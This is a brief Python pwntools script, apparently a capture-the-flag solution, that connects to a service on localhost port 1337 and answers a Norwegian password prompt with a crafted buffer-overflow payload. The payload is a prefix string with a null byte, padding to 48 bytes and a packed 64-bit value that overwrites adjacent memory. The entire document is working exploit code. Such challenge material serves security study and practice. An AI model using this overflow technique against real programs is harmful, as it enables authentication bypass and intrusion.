#!/usr/bin/env python3
from pwn import *
io = connect('localhost', 1337)
payload = b'sikkerhets\0'
payload += b'A'*(48-len(payload))
payload += p64(0x646167656e)
io.sendlineafter(b'passordet: ', payload)
print(io.recvall(timeout=1).decode())
